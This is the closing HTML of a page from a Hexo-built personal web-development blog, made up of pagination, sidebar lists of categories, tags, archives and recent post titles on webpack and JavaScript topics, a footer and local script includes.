  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%86%E4%BA%AB/" rel="tag">分享</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%BC%E8%88%AA/" rel="tag">导航</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Git/">Git</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Ngnix/">Ngnix</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/React/">React</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/ajax/">ajax</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/algorithm/">algorithm</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/cache/">cache</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/css2-1/">css2.1</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/funny/">funny</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/http/">http</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/javascript/">javascript</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/memory/">memory</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/other/">other</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/project/">project</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/storage/">storage</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/utils/">utils</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/vue2-x/">vue2.x</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/webpack/">webpack</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%88%86%E4%BA%AB/" rel="tag">分享</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%BC%E8%88%AA/" rel="tag">导航</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/%E5%88%86%E4%BA%AB/" style="font-size: 10px;">分享</a> <a href="/tags/%E5%AF%BC%E8%88%AA/" style="font-size: 10px;">导航</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/11/21/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2020/07/02/%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%85%BC%E5%AE%B9/">软件的兼容</a>
          </li>
        
          <li>
            <a href="/2019/09/09/webpack%E5%BC%82%E6%AD%A5%E5%8A%A0%E8%BD%BD%E7%BB%84%E4%BB%B6%E5%8E%9F%E7%90%86/">webpack异步加载组件原理.md</a>
          </li>
        
          <li>
            <a href="/2019/09/09/%E7%BB%84%E4%BB%B6%E7%9A%84%E6%8C%89%E9%9C%80%E5%8A%A0%E8%BD%BD/">组件的按需加载</a>
          </li>
        
          <li>
            <a href="/2019/09/06/%E5%8E%9F%E5%9E%8B%E9%93%BE/">原型链</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>